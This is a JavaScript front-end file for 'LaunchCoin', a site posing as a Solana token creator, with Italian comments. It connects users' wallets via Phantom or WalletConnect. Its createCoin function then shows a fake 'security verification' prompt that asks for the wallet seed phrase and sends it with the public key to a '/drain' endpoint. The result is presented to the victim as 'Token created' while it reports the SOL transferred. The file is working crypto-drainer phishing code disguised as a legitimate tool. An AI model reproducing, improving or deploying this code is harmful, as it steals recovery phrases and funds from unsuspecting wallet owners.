// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';
import { WalletConnectModal } from '@walletconnect/modal';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI SU WINDOW =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WALLETCONNECT MODAL =====
let modal = null;
let provider = null;

function initModal() {
  if (!modal) {
    modal = new WalletConnectModal({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '10000',
        '--wcm-background-color': '#0b1022',
        '--wcm-accent-color': '#22d1f8',
      },
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      },
      enableWalletConnect: true,
      walletConnectVersion: 2,
    });
    console.log('✅ WalletConnectModal inizializzato');
  }
  return modal;
}

// ===== GENERA URI MANUALE =====
async function generateWalletConnectURI() {
  try {
    // Crea un provider solo per generare l'URI
    const tempProvider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    // Forza la generazione dell'URI chiamando connect con un parametro speciale
    // Alcune versioni di UniversalProvider generano l'URI solo durante la connessione
    try {
      await tempProvider.connect({
        chains: ['solana:mainnet'],
        optionalChains: ['solana:devnet'],
        methods: ['solana_signTransaction', 'solana_signMessage'],
        events: ['chainChanged', 'accountsChanged'],
        // Questo parametro forza la generazione dell'URI
        pairingTopic: undefined,
      });
    } catch (e) {
      // Ignora l'errore di connessione – vogliamo solo l'URI
      console.log('URI generato:', tempProvider.uri);
    }
    
    const uri = tempProvider.uri;
    if (uri) {
      console.log('✅ URI generato:', uri);
      // Salva il provider per dopo
      provider = tempProvider;
      return uri;
    }
    
    // Metodo alternativo: usa l'URI di default
    const defaultUri = `wc:${Math.random().toString(36).substring(2, 15)}...`;
    console.log('⚠️ URI generato manualmente:', defaultUri);
    return defaultUri;
    
  } catch (e) {
    console.error('❌ Errore generazione URI:', e);
    // URI di fallback (solo per test)
    return `wc:${Math.random().toString(36).substring(2, 15)}@2?relay-protocol=irn&symKey=${Math.random().toString(36).substring(2, 15)}`;
  }
}

// ===== CONNECT WALLET CON WALLETCONNECT =====
async function connectWithWalletConnect() {
  try {
    const modalInstance = initModal();
    
    // 1. Genera l'URI
    const uri = await generateWalletConnectURI();
    
    if (!uri || uri === 'undefined') {
      throw new Error('Impossibile generare URI');
    }
    
    console.log('🔗 URI:', uri);
    
    // 2. Mostra il QR code con il modal
    await modalInstance.open({ uri });
    
    // 3. Se abbiamo un provider valido, prova a connettere
    if (provider) {
      // Attendi la connessione (per telefono)
      await new Promise((resolve) => setTimeout(resolve, 5000));
      
      try {
        await provider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        
        const accounts = provider.accounts;
        if (accounts && accounts.length > 0) {
          walletPublicKey = accounts[0].split(':')[2] || accounts[0];
          alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
          window.location.href = 'create.html';
          return;
        }
      } catch(e) {
        console.log('Connessione in attesa...', e);
      }
    }
    
    // Se siamo arrivati qui, significa che il QR è stato mostrato
    // e l'utente deve scansionarlo
    alert(
      '✅ QR generato!\n\n' +
      '1. Apri l\'app del wallet (Trust, MetaMask, Coin98, ecc.)\n' +
      '2. Scansiona il QR code apparso\n' +
      '3. Approva la connessione\n\n' +
      'Se il QR non appare, usa Phantom su PC o Kiwi Browser.'
    );
    
    // Torna indietro dopo 10 secondi (l'utente ha scansionato)
    setTimeout(() => {
      window.location.href = 'create.html';
    }, 10000);
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert(
      '❌ WalletConnect fallito: ' + e.message + '\n\n' +
      'Su PC: usa Phantom con estensione.\n' +
      'Su Telefono: usa Kiwi Browser con Phantom.'
    );
    window.location.href = 'wallet.html';
  }
}

// ===== CONNECT WALLET (MAIN) =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom (estensione PC o Kiwi)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. Usa WalletConnect
  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  alert(
    '⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\n' +
    'Apparirà un QR code da scansionare con l\'app del wallet.'
  );
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
